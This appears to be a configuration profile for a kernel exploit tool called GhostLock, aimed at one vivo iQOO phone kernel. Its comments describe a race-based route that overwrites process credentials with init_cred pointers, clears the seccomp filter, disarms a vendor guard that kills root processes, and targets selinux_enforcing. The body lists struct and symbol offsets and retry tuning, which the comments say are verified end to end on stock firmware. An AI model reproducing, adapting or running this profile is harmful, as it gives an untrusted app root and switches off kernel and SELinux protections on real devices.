# GhostLock kernel profile: 6.1.145-android14-11-maybe-dirty (HOCON).
#
# vivo iQOO Z9 Turbo, kernel 6.1.145-android14-11-maybe-dirty.
# Values measured on the device itself (kallsyms + BTF + /proc/iomem
# cross-checked) and verified end-to-end on the stock firmware: privilege
# escalation, KernelSU late-load and module load all succeed with this
# profile.
#
# Same-release collision: this string is vendor-anti-matched (/proc/version
# reports placeholder build-user/build-host), and other vivo models report
# the identical string with offsets that differ by up to ~3 MB (e.g. the
# iQOO 12 / V2307A image: selinux_enforcing 0x02249400 there vs 0x025585F8
# here, and a different init_cred slide). This entry carries the Z9 Turbo
# offsets only; reusing it on a different device writes W1 to the wrong
# address and resets the SoC watchdog.
#
# Route: multicast_waiter. One setsockopt is one lottery ticket (the copy
# races skb page recycling); the arm starts only after the earlier copies
# have overwritten each other, and the waiter thread holds on yield until
# the consumer has walked. fallback = none: no other route is derivable on
# this image, and a fallback would run a route that panics.
#
# Ancillary vr.ko guard: this firmware ships vivo's vr.ko, which kills any
# process that holds uid 0 on its next sys_exit — that is what takes ksud
# and the shells it spawns down. W1c disarms the sys_exit tracepoint
# globally (offset.vr_sys_exit_tp + vr_guard.tracepoint_funcs compose into
# the __tracepoint_sys_exit->funcs target); W2b additionally clears the
# per-task tags. The runtime check for vr.ko in /proc/modules happens on
# the device, so a firmware that removed vr.ko simply skips both.
include "credential-6x.conf"
include "kernelsnitch-6x.conf"
release = "6.1.145-android14-11-maybe-dirty"
schema_version = 1
kernel_major = 6
# The direct path completes without Shizuku: it runs as untrusted_app, W3
# clears the seccomp filter, and the iomem cache the app seeds supplies the
# multicast geometry.
recommend_shizuku = 0
recommend_vr_guard = 1
kernel_phys_load = 2818572288
route {
  multicast_waiter {
    waiter_off = 96
    buffer_size = 264
    task_offset = 48
    lock_offset = 56
    compact_waiter = 1
    # Poison/walk repetition from the reference kit's working configuration
    # on this kernel line. This build keeps its compiled-in multicast
    # defaults; the keys document the reference tuning and stay inert here.
    attempts = 128
    arm_sequence = 16
    arm_hold = 20000
  }
}
fallback {
  to = "none"
}
execution {
  # The pair straddling the big-core clusters is stable across runs, unlike
  # the 0/1 default; offered as the default pair until the user picks one.
  recommended_cpus {
    main = 4
    consumer = 5
  }
  heap {
    # Retrying kernel page preparation 12 times ("prepare_kernel_page retry
    # 1/12" in the reference kit's success logs); the shared default of 4
    # exhausts on this kernel line before the route is even reached.
    prepare_max_attempts = 12
  }
}
kernelsnitch {
  mm_struct_sz = 1024
  collisions = 8
}
task_struct {
  prio = 132
  normal_prio = 140
  sched_task_group = 840
  pi_lock = 2340
  pi_waiters = 2360
  pi_top_task = 2376
  pi_blocked_on = 2384
  pid = 1584
  tgid = 1588
  atomic_flags = 1520
  real_cred = 2096
  cred = 2104
  comm = 2120
  tasks = 1360
  seccomp = 2304
}
cred {
  # multicast requires copy_size >= 0xa0; this kernel's sizeof(struct cred)
  # is 0xa0 (ref3_offset 152 + 8), so the shared 136-byte template is too
  # small.
  copy_size = 176
  usage_offset = 0
  # init_cred's pointer fields, read out of this device's own kernel image
  # (root_user / init_user_ns / init_ucounts / init_groups).
  ref_count = 4
  ref0_offset = 128
  ref1_offset = 136
  ref2_offset = 144
  ref3_offset = 152
  ref0_image = -70292401720
  ref1_image = -70292402384
  ref2_image = -70292395400
  ref3_image = -70292396824
}
# offsetof(struct tracepoint, funcs), read from this image's BTF. 6.6 moved
# the field behind probestub (+0x48); on 6.1 it stays at +0x40.
vr_guard {
  tracepoint_funcs = 64
}
offset {
  init_task = 35519488
  init_cred = 35595504
  empty_zero_page = 37859328
  root_task_group = 37889856
  selinux_enforcing = 39159464
  selinux_blob_sizes = 24052824
  security_hook_heads = 24051016
  slide_nfulnl_logger = 35467160
  slide_loggers_0_1 = 35466984
  slide_boot_id = 39296200
  vr_sys_exit_tp = 37532352
}
